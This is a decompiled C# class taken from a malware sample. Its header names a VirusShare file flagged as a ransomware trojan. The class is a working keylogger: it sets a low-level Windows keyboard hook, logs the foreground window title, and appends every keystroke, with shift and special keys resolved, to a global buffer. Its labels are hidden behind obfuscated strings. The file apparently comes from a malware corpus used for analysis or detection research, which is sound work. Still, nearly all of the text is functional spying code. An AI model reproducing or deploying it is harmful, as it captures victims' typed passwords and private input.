// Decompiled with JetBrains decompiler
// Type: VPXNIVH
// Assembly: Script Master v7, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: C455AE42-10CE-458F-A8B3-AF5A9B9CC8DE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-eeafb61ec37b2a763da8693f22cd1ef63e43485408848c106d517b546e13c487.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class VPXNIVH
{
  private string output;
  private static IntPtr OKCLRMK = (IntPtr) 0;
  private static string XYPNPD = "";
  private static VPXNIVH.KeyboardHookDelegate OPHNUVD = (VPXNIVH.KeyboardHookDelegate) null;

  public static string LHTWUF(IntPtr hWnd)
  {
    string str;
    try
    {
      if (hWnd.ToInt32() <= 0)
      {
        str = (string) null;
      }
      else
      {
        int windowTextLength = VPXNIVH.GetWindowTextLength(hWnd);
        if (windowTextLength == 0)
        {
          str = (string) null;
        }
        else
        {
          StringBuilder lpString = new StringBuilder(checked (windowTextLength + 1));
          VPXNIVH.GetWindowText((int) hWnd, lpString, lpString.Capacity);
          str = lpString.ToString().Trim();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public static bool DBEKFY()
  {
    bool flag;
    try
    {
      flag = VPXNIVH.OKCLRMK != (IntPtr) 0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  public static void HFJBSVH()
  {
    try
    {
      VPXNIVH.OPHNUVD = new VPXNIVH.KeyboardHookDelegate(VPXNIVH.KYBRDLCK);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      VPXNIVH.OKCLRMK = (IntPtr) VPXNIVH.SetWindowsHookEx(13, VPXNIVH.OPHNUVD, (int) Process.GetCurrentProcess().MainModule.BaseAddress, 0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void FHBELO()
  {
    try
    {
      if (!VPXNIVH.DBEKFY() || VPXNIVH.UnhookWindowsHookEx((int) VPXNIVH.OKCLRMK) == 0)
        return;
      VPXNIVH.OKCLRMK = (IntPtr) 0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int UnhookWindowsHookEx(int hHook);

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetAsyncKeyState(int vKey);

  [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int SetWindowsHookEx(
    int idHook,
    VPXNIVH.KeyboardHookDelegate lpfn,
    int hmod,
    int dwThreadId);

  public static int KYBRDLCK(int Code, int WPA, ref VPXNIVH.VOSEHB LPA)
  {
    try
    {
      string Left = VPXNIVH.LHTWUF(VPXNIVH.GetForegroundWindow());
      if (Operators.CompareString(Left, VPXNIVH.XYPNPD, false) != 0)
      {
        VPXNIVH.XYPNPD = Left;
        NTUIYURW.KSQKXQN = NTUIYURW.KSQKXQN + Environment.NewLine + GOSLWHR.WHJBIYT("hXOKhHZXcn2EdldyfYR2V3J9hHZXcn2EdldyfYR2V3J9Hw==", "False") + " " + Left + " " + GOSLWHR.WHJBIYT("aoWQl4lqhZCXiWqFkJeJaoWQl4lqhZCXiWqFkJeJd4bADA==", "False") + Environment.NewLine + Environment.NewLine;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      Thread.Sleep(10);
      string str = "";
      if (WPA == 256 | WPA == 260)
      {
        switch (LPA.UTTILO)
        {
          case 8:
            NTUIYURW.KSQKXQN = NTUIYURW.KSQKXQN.Substring(0, checked (NTUIYURW.KSQKXQN.Length - 1));
            break;
          case 9:
            str = char.ConvertFromUtf32(9);
            break;
          case 13:
            str = Environment.NewLine;
            break;
          case 16:
          case 160:
          case 161:
            str = "";
            break;
          case 18:
            str = GOSLWHR.WHJBIYT("W7Gi1M6Ydg0=", "False");
            break;
          case 20:
            str = !Control.IsKeyLocked(Keys.Capital) ? GOSLWHR.WHJBIYT("Q5mMkZJ2XpWfhW5emJ6fQyQ=", "False") : GOSLWHR.WHJBIYT("QpiLkJF1XZSehG1dl5WHf10m", "False");
            break;
          case 27:
            str = GOSLWHR.WHJBIYT("S6GWy62IZh0=", "False");
            break;
          case 32:
            str = GOSLWHR.WHJBIYT("RyA=", "False");
            break;
          case 33:
            str = GOSLWHR.WHJBIYT("Zbu708uqtdvPhAE=", "False");
            break;
          case 34:
            str = GOSLWHR.WHJBIYT("VKqqwrqZk8nYwZFvFA==", "False");
            break;
          case 35:
            str = GOSLWHR.WHJBIYT("R52SwqqEYiE=", "False");
            break;
          case 36:
            str = GOSLWHR.WHJBIYT("WrCo1safsoAP", "False");
            break;
          case 37:
            str = GOSLWHR.WHJBIYT("U6mVvXIT", "False");
            break;
          case 38:
            str = GOSLWHR.WHJBIYT("SJ6ssmce", "False");
            break;
          case 39:
            str = GOSLWHR.WHJBIYT("X7WjyX4H", "False");
            break;
          case 40:
            str = GOSLWHR.WHJBIYT("O5GXpVor", "False");
            break;
          case 46:
            str = GOSLWHR.WHJBIYT("WrCkzMWXdQ4=", "False");
            break;
          case 48:
          case 49:
          case 50:
          case 51:
          case 52:
          case 53:
          case 54:
          case 55:
          case 56:
          case 57:
            if (MyProject.Computer.Keyboard.ShiftKeyDown)
            {
              string[] strArray = GOSLWHR.WHJBIYT("YnynjoNhgIeTgJ98jY6KYYSHlwk=", "False").Split(Conversions.ToChar(GOSLWHR.WHJBIYT("VBM=", "False")));
              switch (LPA.UTTILO)
              {
                case 48:
                  str = strArray[9];
                  break;
                case 49:
                  str = strArray[0];
                  break;
                case 50:
                  str = strArray[1];
                  break;
                case 51:
                  str = strArray[2];
                  break;
                case 52:
                  str = strArray[3];
                  break;
                case 53:
                  str = strArray[4];
                  break;
                case 54:
                  str = strArray[5];
                  break;
                case 55:
                  str = strArray[6];
                  break;
                case 56:
                  str = strArray[7];
                  break;
                case 57:
                  str = strArray[8];
                  break;
              }
            }
            else
            {
              str = char.ConvertFromUtf32(LPA.UTTILO);
              break;
            }
            break;
          case 65:
          case 66:
          case 67:
          case 68:
          case 69:
          case 70:
          case 71:
          case 72:
          case 73:
          case 74:
          case 75:
          case 76:
          case 77:
          case 78:
          case 79:
          case 80:
          case 81:
          case 82:
          case 83:
          case 84:
          case 85:
          case 86:
          case 87:
          case 88:
          case 89:
          case 90:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? char.ConvertFromUtf32(checked (LPA.UTTILO + 32)).ToLower() : char.ConvertFromUtf32(checked (LPA.UTTILO + 32)).ToUpper();
            break;
          case 91:
          case 92:
            str = GOSLWHR.WHJBIYT("Q5mgubBls73EsZGbaSY=", "False");
            break;
          case 112:
          case 113:
          case 114:
          case 115:
          case 116:
          case 117:
          case 118:
          case 119:
          case 120:
          case 121:
          case 122:
          case 123:
          case 124:
          case 125:
          case 126:
          case (int) sbyte.MaxValue:
          case 128:
          case 129:
          case 130:
          case 131:
          case 132:
          case 133:
          case 134:
          case 135:
            str = GOSLWHR.WHJBIYT("UaedGA==", "False") + Conversions.ToString(checked (LPA.UTTILO - 111)) + GOSLWHR.WHJBIYT("o4EC", "False");
            break;
          case 144:
            str = !MyProject.Computer.Keyboard.NumLock ? GOSLWHR.WHJBIYT("ZLq45tCQzs3cg5PNx5EG", "False") : GOSLWHR.WHJBIYT("SZ+dy7V1s7LBaHiqtbNoHQ==", "False");
            break;
          case 162:
          case 163:
            str = GOSLWHR.WHJBIYT("Vaue0cKpwsrOsVUS", "False");
            break;
          case 164:
          case 165:
            str = GOSLWHR.WHJBIYT("RJqLvbeBXyQ=", "False");
            break;
          case 186:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? GOSLWHR.WHJBIYT("cBI=", "False") : GOSLWHR.WHJBIYT("axY=", "False");
            break;
          case 187:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? GOSLWHR.WHJBIYT("WSs=", "False") : GOSLWHR.WHJBIYT("bAY=", "False");
            break;
          case 188:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? GOSLWHR.WHJBIYT("YhE=", "False") : GOSLWHR.WHJBIYT("XCc=", "False");
            break;
          case 189:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? GOSLWHR.WHJBIYT("cAQ=", "False") : GOSLWHR.WHJBIYT("eC4=", "False");
            break;
          case 190:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? GOSLWHR.WHJBIYT("ZRA=", "False") : GOSLWHR.WHJBIYT("bRg=", "False");
            break;
          case 191:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? GOSLWHR.WHJBIYT("aQ0=", "False") : GOSLWHR.WHJBIYT("gQU=", "False");
            break;
          case 192:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? GOSLWHR.WHJBIYT("lBM=", "False") : GOSLWHR.WHJBIYT("vQg=", "False");
            break;
          case 219:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? GOSLWHR.WHJBIYT("mgg=", "False") : GOSLWHR.WHJBIYT("wAI=", "False");
            break;
          case 220:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? GOSLWHR.WHJBIYT("czA=", "False") : GOSLWHR.WHJBIYT("vwQ=", "False");
            break;
          case 221:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? GOSLWHR.WHJBIYT("gSM=", "False") : GOSLWHR.WHJBIYT("rBg=", "False");
            break;
          case 222:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? GOSLWHR.WHJBIYT("bQE=", "False") : GOSLWHR.WHJBIYT("Ths=", "False");
            break;
          default:
            str = char.ConvertFromUtf32(LPA.UTTILO);
            break;
        }
        NTUIYURW.KSQKXQN += str;
        NTUIYURW.JOJFO = NTUIYURW.KSQKXQN;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    int num;
    return num;
  }

  [DllImport("user32.dll", SetLastError = true)]
  public static extern IntPtr GetForegroundWindow();

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern int GetWindowTextLength(IntPtr hwnd);

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetWindowText(int hwnd, StringBuilder lpString, int cch);

  public VPXNIVH(string output)
  {
    try
    {
      this.output = output;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private delegate int KeyboardHookDelegate(int Code, int wParam, ref VPXNIVH.VOSEHB lParam);

  public struct VOSEHB
  {
    public int UTTILO;
    public int UOFFJO;
    public int JNLOCO;
    public int FYXYVK;
    public int UYHFRB;
  }
}
